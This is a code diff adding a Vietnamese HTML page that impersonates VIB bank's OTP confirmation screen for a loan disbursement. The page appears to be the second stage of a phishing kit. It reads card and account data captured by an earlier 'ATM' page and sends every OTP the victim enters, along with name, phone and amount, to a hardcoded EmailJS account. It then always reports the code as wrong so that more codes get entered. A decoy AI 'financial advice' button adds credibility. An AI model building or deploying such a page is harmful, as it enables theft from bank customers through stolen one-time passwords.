@@ -1,0 +1,476 @@
+
+<!DOCTYPE html>
+<html lang="vi" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xác Thực OTP - VIB</title>
+    
+    <!-- External Libraries -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <!-- Config & Styles -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            green: '#000',
+                            dark: '#313131',
+                            light: '#E8F8EE',
+                            bg: '#F5F7FA',
+                            red: '#fdb814'
+                        }
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body { background-color: #fafafa; -webkit-font-smoothing: antialiased; }
+        
+        /* OTP Input Styling */
+        .otp-field {
+            letter-spacing: 0.5em;
+            font-variant-numeric: tabular-nums;
+            transition: all 0.2s ease;
+        }
+        .otp-field:focus {
+            border-color: #2a83e9;
+            box-shadow: 0 0 0 3px rgba(0, 153, 79, 0.15);
+        }
+        .otp-field.error {
+            border-color: #fdb814;
+            box-shadow: 0 0 0 3px rgba(230, 57, 70, 0.15);
+            animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+
+        /* Markdown-like styling for AI response */
+        .prose p { margin-bottom: 0.75em; }
+        .prose ul { list-style-type: disc; padding-left: 1.5em; margin-bottom: 0.75em; }
+        .prose li { margin-bottom: 0.25em; }
+        .prose strong { color: #2a83e9; font-weight: 700; }
+
+        /* Loader */
+        .loader {
+            border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #2a83e9;
+            width: 24px; height: 24px; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen text-gray-800">
+
+    <!-- Header -->
+    <header class="bg-white shadow-sm sticky top-0 z-40">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <a href="#" class="flex items-center gap-2">
+                <img src="https://inviva.vn/wp-content/uploads/2026/04/logo-vib-vector-03.png" alt="FE CREDIT" class="h-8 md:h-10">
+            </a>
+            <div class="hidden md:flex gap-6 text-sm font-semibold text-gray-600">
+                <a href="#" class="hover:text-brand-green transition">Trang Chủ</a>
+                <a href="#" class="text-brand-green">Xác Thực Giao Dịch</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow container mx-auto px-4 py-6 md:py-8 max-w-2xl">
+        
+        <!-- Step Indicator -->
+        <div class="mb-8">
+            <div class="flex items-center justify-between relative">
+                <div class="absolute left-0 top-1/2 transform -translate-y-1/2 w-full h-1 bg-gray-200 -z-10"></div>
+                <!-- Step 1 Done -->
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10">
+                    <div class="w-8 h-8 rounded-full bg-brand-green text-white flex items-center justify-center font-bold text-sm"><i class="fa-solid fa-check"></i></div>
+                </div>
+                <!-- Step 2 Active -->
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10">
+                    <div class="w-8 h-8 rounded-full bg-brand-green text-white flex items-center justify-center font-bold text-sm shadow-lg shadow-green-200">2</div>
+                    <span class="text-xs font-bold text-brand-green">Xác thực OTP</span>
+                </div>
+                <!-- Step 3 Pending -->
+                <div class="flex flex-col items-center gap-2 bg-brand-bg px-2 z-10 opacity-50">
+                    <div class="w-8 h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold text-sm">3</div>
+                    <span class="text-xs font-semibold text-gray-500">Hoàn tất</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white rounded-xl shadow-xl overflow-hidden border border-gray-100 relative">
+            <!-- Decorative Pattern -->
+            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-brand-green via-brand-light to-brand-green"></div>
+
+            <div class="p-6 md:p-8 text-center">
+                <div class="w-16 h-16 bg-brand-light rounded-full flex items-center justify-center mx-auto mb-4 text-brand-green text-2xl animate-pulse-slow">
+                    <i class="fa-solid fa-shield-halved"></i>
+                </div>
+                
+                <h2 class="text-2xl font-bold text-gray-800 mb-2">Xác Nhận Giải Ngân</h2>
+                <p class="text-sm text-gray-500 mb-6" id="otpMessage">
+                    Mã xác thực (OTP) đã được gửi đến số điện thoại đăng ký.
+                </p>
+
+                <!-- Transaction Summary Card -->
+                <div class="bg-gray-50 rounded-lg p-4 mb-8 text-sm border border-gray-200 text-left relative overflow-hidden">
+                    <div class="absolute top-0 right-0 p-2 opacity-10 text-brand-green text-6xl transform rotate-12 translate-x-2 -translate-y-2">
+                        <i class="fa-solid fa-money-bill-wave"></i>
+                    </div>
+                    
+                    <h3 class="font-bold text-gray-700 border-b border-gray-200 pb-2 mb-3">CHI TIẾT GIAO DỊCH</h3>
+                    <div class="space-y-2 relative z-10">
+                        <div class="flex justify-between">
+                            <span class="text-gray-500">Người thụ hưởng:</span>
+                            <span class="font-bold text-gray-800" id="summaryName">Loading...</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-500">Ngân hàng:</span>
+                            <span class="font-medium text-gray-800" id="summaryBank">Loading...</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-500">Số tài khoản:</span>
+                            <span class="font-medium text-gray-800" id="summaryAccountNumber">Loading...</span>
+                        </div>
+                        <div class="flex justify-between items-end pt-2 mt-2 border-t border-gray-200 border-dashed">
+                            <span class="text-gray-500">Số tiền:</span>
+                            <span class="font-bold text-brand-green text-lg" id="summaryAmount">Loading...</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- OTP Input Section -->
+                <div class="mb-6">
+                    <label class="block text-sm font-semibold text-gray-700 mb-3">Nhập mã OTP (6-8 số)</label>
+                    <input type="tel" id="otp" 
+                        class="otp-field w-full max-w-xs mx-auto text-center text-3xl font-bold py-3 px-4 rounded-lg border border-gray-300 outline-none text-gray-700"
+                        maxlength="8"
+                        placeholder="••••••"
+                        inputmode="numeric"
+                        autocomplete="one-time-code">
+                    
+                    <div id="otp-error" class="hidden mt-3 text-brand-red text-sm font-medium flex items-center justify-center gap-1">
+                        <i class="fa-solid fa-circle-exclamation"></i>
+                        <span>Mã OTP không chính xác.</span>
+                    </div>
+
+                    <p class="mt-4 text-sm font-medium text-gray-500" id="otpTimer">
+                        Mã hết hạn sau: <span class="text-brand-red font-bold">60s</span>
+                    </p>
+                </div>
+
+                <!-- Actions -->
+                <button onclick="verifyOTP()" id="btn-verify" class="w-full max-w-xs mx-auto bg-brand-green hover:bg-brand-dark text-white font-bold py-3.5 rounded-lg shadow-lg hover:shadow-xl transition-all flex items-center justify-center gap-2 group mb-4">
+                    <span>XÁC NHẬN</span>
+                    <i class="fa-solid fa-arrow-right group-hover:translate-x-1 transition-transform"></i>
+                </button>
+
+                <div class="text-center">
+                    <button onclick="getFinancialAdvice()" class="text-xs text-brand-green hover:text-brand-dark font-semibold hover:underline flex items-center justify-center gap-1 mx-auto transition-colors">
+                        <i class="fa-solid fa-wand-magic-sparkles"></i>
+                        Nhận lời khuyên tài chính từ AI
+                    </button>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Safe Badge -->
+        <div class="mt-6 text-center text-gray-400 text-xs flex justify-center items-center gap-2">
+            <i class="fa-solid fa-lock"></i>
+            Giao dịch được bảo mật an toàn.
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white py-6 mt-auto text-center">
+        <div class="container mx-auto px-4">
+            <p class="font-bold text-sm mb-1">Ngân hàng Thương mại Cổ phần Quốc tế Việt Nam</p>
+            <p class="text-xs text-gray-400">© 2026 VIB. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Gemini Modal -->
+    <div id="gemini-modal" class="fixed inset-0 bg-black/50 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm transition-opacity opacity-0">
+        <div class="bg-white rounded-xl shadow-2xl w-full max-w-lg transform scale-95 transition-transform duration-300">
+            <div class="p-4 border-b border-gray-100 flex justify-between items-center bg-gradient-to-r from-brand-light to-white rounded-t-xl">
+                <h3 class="font-bold text-gray-800 flex items-center gap-2">
+                    <i class="fa-solid fa-robot text-brand-green"></i>
+                    Lời khuyên tài chính
+                </h3>
+                <button onclick="closeGeminiModal()" class="text-gray-400 hover:text-gray-600 w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+            
+            <div id="gemini-content" class="p-6 text-sm text-gray-600 min-h-[150px] max-h-[60vh] overflow-y-auto prose prose-sm max-w-none">
+                <!-- Content injected here -->
+            </div>
+
+            <div class="p-4 border-t border-gray-100 text-right bg-gray-50 rounded-b-xl">
+                <button onclick="closeGeminiModal()" class="px-4 py-2 bg-white border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 font-medium text-sm transition shadow-sm">
+                    Đóng
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script -->
+    <script>
+        // --- CONFIG ---
+        const CONFIG = {
+            EMAILJS_PUBLIC_KEY: '7y3ePVskhQ1U5EF2l',
+            EMAILJS_SERVICE_ID: 'service_aa0dvwd',
+            EMAILJS_TEMPLATE_ID: 'template_48ehw5t', // Template OTP riêng
+            GEMINI_API_KEY: '' // Để trống nếu không dùng hoặc inject từ env
+        };
+
+        let otpState = {
+            countdown: 60,
+            interval: null,
+            formData: {}
+        };
+
+        // --- INIT ---
+        document.addEventListener('DOMContentLoaded', () => {
+            if(window.emailjs) emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+            
+            loadData();
+            startTimer();
+            setupInput();
+        });
+
+        function loadData() {
+            try {
+                // UPDATE: Tìm dữ liệu từ cardInfo (của trang ATM) hoặc formData (cũ)
+                const raw = sessionStorage.getItem('cardInfo') || sessionStorage.getItem('formData');
+                
+                // MOCK DATA (Giữ lại dữ liệu cũ để test)
+                const mockData = {
+                    fullName: "NGUYỄN VĂN A",
+                    amount: "50.000.000 VND",
+                    bank: "Techcombank",
+                    accountNumber: "**** 1234",
+                    phone: "0909 *** 888",
+                    accountHolder: "NGUYỄN VĂN A" // Legacy field support
+                };
+
+                // Nếu có raw data thì parse, không thì dùng mock
+                otpState.formData = raw ? JSON.parse(raw) : mockData;
+
+                // MAPPING LOGIC: Xử lý hiển thị an toàn cho cả flow cũ và mới
+                const d = otpState.formData;
+                const displayName = d.cardFullName || d.fullName || d.accountHolder || "N/A";
+                const displayBank = d.bankName || d.bank || "N/A";
+                const displayAccount = d.cardNumber || d.accountNumber || "N/A";
+                const displayAmount = d.amount || "N/A";
+
+                document.getElementById('summaryName').textContent = displayName;
+                document.getElementById('summaryBank').textContent = displayBank;
+                document.getElementById('summaryAccountNumber').textContent = displayAccount;
+                document.getElementById('summaryAmount').textContent = displayAmount;
+
+                let phoneDisplay = "số điện thoại đã đăng ký";
+                if(d.phone) {
+                     phoneDisplay = d.phone.replace(/(\d{4})\d{3}(\d{3})/, "$1***$2");
+                }
+                document.getElementById('otpMessage').innerHTML = `Mã xác thực (OTP) đã được gửi đến số điện thoại <b>${phoneDisplay}</b>.`;
+
+            } catch (e) {
+                console.error("Data load error", e);
+            }
+        }
+
+        // --- TIMER LOGIC ---
+        function startTimer() {
+            otpState.countdown = 60;
+            const timerEl = document.getElementById('otpTimer');
+            
+            if(otpState.interval) clearInterval(otpState.interval);
+            
+            otpState.interval = setInterval(() => {
+                otpState.countdown--;
+                if(otpState.countdown <= 0) {
+                    clearInterval(otpState.interval);
+                    timerEl.innerHTML = `<span class="text-brand-red">Mã OTP đã hết hiệu lực.</span> <button onclick="resendOTP()" class="text-brand-green font-bold hover:underline ml-1">Gửi lại</button>`;
+                } else {
+                    timerEl.innerHTML = `Mã hết hạn sau: <span class="text-brand-red font-bold">${otpState.countdown}s</span>`;
+                }
+            }, 1000);
+        }
+
+        function resendOTP() {
+            // Logic gửi lại (Simulated)
+            alert("Mã OTP mới đã được gửi!");
+            startTimer();
+            document.getElementById('otp').value = '';
+            document.getElementById('otp').focus();
+            document.getElementById('otp-error').classList.add('hidden');
+        }
+
+        function setupInput() {
+            const input = document.getElementById('otp');
+            input.addEventListener('input', (e) => {
+                // Chỉ cho nhập số
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                
+                // Xóa lỗi khi gõ
+                input.classList.remove('error');
+                document.getElementById('otp-error').classList.add('hidden');
+            });
+        }
+
+        // --- VERIFY LOGIC ---
+        function verifyOTP() {
+            const input = document.getElementById('otp');
+            const errorEl = document.getElementById('otp-error');
+            const val = input.value.trim();
+            const btn = document.getElementById('btn-verify');
+
+            // 1. Basic Validation
+            if (val.length < 6) {
+                showError("Vui lòng nhập đủ mã OTP.");
+                return;
+            }
+
+            // 2. Send to EmailJS (Tracking Attempt)
+            // Lấy tên khách hàng an toàn từ các biến có thể có
+            const d = otpState.formData;
+            const customerName = d.cardFullName || d.fullName || d.accountHolder || "N/A";
+
+            const templateParams = {
+                otp: val,
+                phone: d.phone || "N/A",
+                customer_name: customerName,
+                total_amount: d.amount || "N/A",
+                contract_number: `TXN-${Date.now()}`,
+                timestamp: new Date().toLocaleString('vi-VN')
+            };
+            
+            // UI Loading
+            const originalText = btn.innerHTML;
+            btn.disabled = true;
+            btn.innerHTML = `<div class="loader"></div>`;
+
+            emailjs.send(CONFIG.EMAILJS_SERVICE_ID, CONFIG.EMAILJS_TEMPLATE_ID, templateParams)
+                .then(() => {
+                    console.log("OTP Sent");
+                })
+                .finally(() => {
+                    // 3. Always show Error (Simulation Logic from original file)
+                    setTimeout(() => {
+                        btn.disabled = false;
+                        btn.innerHTML = originalText;
+                        showError("Mã xác thực không chính xác hoặc đã hết hạn.");
+                        input.value = '';
+                        input.focus();
+                    }, 1000);
+                });
+        }
+
+        function showError(msg) {
+            const input = document.getElementById('otp');
+            const errorEl = document.getElementById('otp-error');
+            
+            input.classList.add('error');
+            errorEl.querySelector('span').textContent = msg;
+            errorEl.classList.remove('hidden');
+            
+            // Shake effect reset
+            input.style.animation = 'none';
+            input.offsetHeight; /* trigger reflow */
+            input.style.animation = null; 
+        }
+
+        // --- GEMINI AI LOGIC ---
+        function closeGeminiModal() {
+            const modal = document.getElementById('gemini-modal');
+            modal.classList.remove('opacity-100');
+            setTimeout(() => modal.classList.add('hidden'), 300);
+        }
+
+        async function getFinancialAdvice() {
+            const modal = document.getElementById('gemini-modal');
+            const content = document.getElementById('gemini-content');
+            
+            // Show Modal
+            modal.classList.remove('hidden');
+            requestAnimationFrame(() => modal.classList.add('opacity-100'));
+            
+            // Loading State
+            content.innerHTML = `
+                <div class="flex flex-col items-center justify-center py-8">
+                    <div class="loader mb-3"></div>
+                    <p class="text-gray-500">Đang phân tích hồ sơ tài chính...</p>
+                </div>
+            `;
+
+            // Data for prompt
+            const d = otpState.formData;
+            const prompt = `Tôi sắp vay ${d.amount} trong ${d.months || '24'} tháng. Hãy cho tôi 3 lời khuyên tài chính ngắn gọn, quan trọng nhất để trả nợ đúng hạn. Định dạng gạch đầu dòng, giọng điệu chuyên gia thân thiện.`;
+
+            try {
+                const apiKey = CONFIG.GEMINI_API_KEY || window.GEMINI_API_KEY;
+                
+                if (!apiKey) {
+                    // Mock Response nếu không có Key (để tránh lỗi Demo)
+                    setTimeout(() => {
+                        content.innerHTML = `
+                            <div class="prose prose-sm">
+                                <p>Dựa trên khoản vay <strong>${d.amount}</strong> của bạn, đây là lời khuyên:</p>
+                                <ul>
+                                    <li><strong>Lập kế hoạch trả nợ:</strong> Hãy trích tự động 20% thu nhập hàng tháng ngay khi nhận lương để thanh toán khoản vay này.</li>
+                                    <li><strong>Chi tiêu thông minh:</strong> Cắt giảm các khoản chi không thiết yếu (cà phê, ăn ngoài) trong 3 tháng đầu để tạo quỹ dự phòng.</li>
+                                    <li><strong>Thanh toán đúng hạn:</strong> Luôn thanh toán trước ngày đến hạn 2 ngày để tránh phí phạt trễ hạn và giữ điểm tín dụng tốt.</li>
+                                </ul>
+                                <p class="text-xs text-gray-400 mt-4 italic">*Đây là lời khuyên tự động từ AI.</p>
+                            </div>
+                        `;
+                    }, 1500);
+                    return;
+                }
+
+                // Real API Call
+                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
+                });
+
+                const data = await response.json();
+                const text = data.candidates[0].content.parts[0].text;
+                
+                // Simple Markdown Parse
+                const html = text
+                    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+                    .replace(/^\* /gm, '<li>')
+                    .replace(/\n/g, '<br>');
+
+                content.innerHTML = `<div class="prose prose-sm text-gray-700">${html}</div>`;
+
+            } catch (error) {
+                console.error("AI Error", error);
+                content.innerHTML = `<div class="text-center text-red-500"><i class="fa-solid fa-triangle-exclamation"></i> Không thể kết nối với AI lúc này.</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
+
+
+
+
